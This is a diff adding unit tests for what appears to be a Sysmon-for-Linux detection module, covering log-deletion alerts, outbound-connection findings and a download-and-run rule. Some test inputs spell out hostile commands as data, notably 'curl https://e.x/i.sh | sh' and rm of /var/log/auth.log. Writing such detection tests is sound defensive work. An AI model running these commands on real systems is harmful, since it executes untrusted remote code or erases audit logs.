@@ -185,6 +185,27 @@ class SysmonLogDeletionTests(unittest.TestCase):
         self.assertEqual(findings[0]["severity"], "high")
 
 
+    def test_savelog_removing_its_oldest_generation_is_not_an_alert(self):
+        guid = "{be5aebaf-1111-2222-3333-444455556666}"
+        start = {"id": 1, "ProcessGuid": guid, "Image": "/usr/bin/rm",
+                 "CommandLine": "rm -f -- /var/log/dmesg.4.gz",
+                 "ParentImage": "/usr/bin/dash",
+                 "ParentCommandLine": "/bin/sh /usr/bin/savelog -m640 -q -p -n -c 5 /var/log/dmesg"}
+        delete = {"id": 26, "ProcessGuid": guid, "Image": "/usr/bin/rm",
+                  "TargetFilename": "/var/log/dmesg.4.gz"}
+        self.assertNotIn(sysmon_linux.LOG_DELETE_TITLE,
+                         [f["title"] for f in sysmon_linux._rules([start, delete])])
+
+    def test_rm_from_savelog_of_a_live_log_stays_high(self):
+        guid = "{be5aebaf-1111-2222-3333-444455556667}"
+        start = {"id": 1, "ProcessGuid": guid, "Image": "/usr/bin/rm",
+                 "ParentCommandLine": "/bin/sh /usr/bin/savelog /var/log/dmesg"}
+        delete = {"id": 26, "ProcessGuid": guid, "Image": "/usr/bin/rm",
+                  "TargetFilename": "/var/log/auth.log"}
+        self.assertIn(sysmon_linux.LOG_DELETE_TITLE,
+                      [f["title"] for f in sysmon_linux._rules([start, delete])])
+
+
 class SysmonPersistenceTests(unittest.TestCase):
     def test_snapd_rewriting_its_own_mount_unit_is_not_an_alert(self):
         for target in (
@@ -320,3 +341,41 @@ class GoBuildTest(unittest.TestCase):
     def test_plain_tmp_binary_stays_high(self):
         out = sysmon_linux._rules([{'id': 1, 'Image': '/tmp/b216/routing.test'}])
         self.assertEqual([f['severity'] for f in out], ['high'])
+
+
+class SysmonEgressTests(unittest.TestCase):
+    def conn(self, image, ip="93.184.216.34", port="443"):
+        return {"id": 3, "Image": image, "DestinationIp": ip, "DestinationPort": port}
+
+    def test_expected_programs_are_judged_by_their_own_name(self):
+        # Event 3 has no ParentImage; the allowlist was checked against it.
+        self.assertEqual([f for f in sysmon_linux._rules([self.conn("/usr/bin/node")])
+                          if f["title"].startswith("outbound")], [])
+
+    def test_one_finding_per_program_not_per_address(self):
+        events = [self.conn("/opt/x/cloudflared", ip) for ip in
+                  ("93.184.216.34", "93.184.216.35", "93.184.216.36")]
+        out = [f for f in sysmon_linux._rules(events) if f["title"].startswith("outbound")]
+        self.assertEqual([(f["severity"], f["title"]) for f in out],
+                         [("medium", "outbound connections from cloudflared")])
+        self.assertIn("3 public destination", out[0]["detail"])
+
+    def test_unresolved_process_is_a_visibility_gap(self):
+        out = [f for f in sysmon_linux._rules([self.conn("")]) if f["title"].startswith("outbound")]
+        self.assertEqual([f["severity"] for f in out], ["low"])
+
+
+class HeredocTests(unittest.TestCase):
+    def run_cmd(self, cmd):
+        e = {"id": 1, "Image": "/usr/bin/bash", "CommandLine": cmd, "ParentImage": "/usr/bin/node"}
+        return [f["title"] for f in sysmon_linux._rules([e])]
+
+    def test_quoted_heredoc_body_is_data(self):
+        cmd = "cd /x && cat > t.test.ts <<'EOF'\nconst s = 'curl https://e.x/i.sh | sh';\nEOF\necho done"
+        self.assertNotIn("download-and-run in a command line", self.run_cmd(cmd))
+
+    def test_code_outside_or_in_unquoted_heredoc_still_counts(self):
+        self.assertIn("download-and-run in a command line",
+                      self.run_cmd("cat > a <<'EOF'\nx\nEOF\ncurl https://e.x/i.sh | sh"))
+        self.assertIn("download-and-run in a command line",
+                      self.run_cmd("cat > a <<EOF\n$(curl https://e.x/i.sh | sh)\nEOF"))
